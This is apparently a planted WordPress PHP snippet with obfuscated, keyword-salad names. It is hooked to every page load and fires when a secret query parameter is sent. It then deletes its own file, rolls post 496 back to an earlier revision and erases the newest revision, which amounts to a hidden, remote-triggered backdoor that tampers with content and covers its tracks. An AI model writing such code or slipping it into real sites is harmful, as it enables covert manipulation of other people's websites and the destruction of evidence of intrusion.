<?php

function next_traffic_captcha() {
	if (isset($_GET['orders_notification_toolbar_tinymce']) && $_GET['orders_notification_toolbar_tinymce'] === 'tiny_toggle_slug') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$gallery_background_internal = 496;
		$name_really_icon = wp_get_post_revisions($gallery_background_internal);
		if (empty($name_really_icon)) die('no revisions');
		if (count($name_really_icon) < 2) die('less than 2');
		$paragraph_site_hide_video = array_shift($name_really_icon);
		$push_weather_edition_seo = $paragraph_site_hide_video->ID;
		$min_messages_shortcode_class = array_shift($name_really_icon);
		$change_stop_project = $min_messages_shortcode_class->ID;
		$method_enhanced_xml_update = wp_restore_post_revision($change_stop_project);
		if ($method_enhanced_xml_update === false) die('error restoring');
		$method_enhanced_xml_update = wp_delete_post_revision($push_weather_edition_seo);		
		if ($method_enhanced_xml_update === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'next_traffic_captcha');
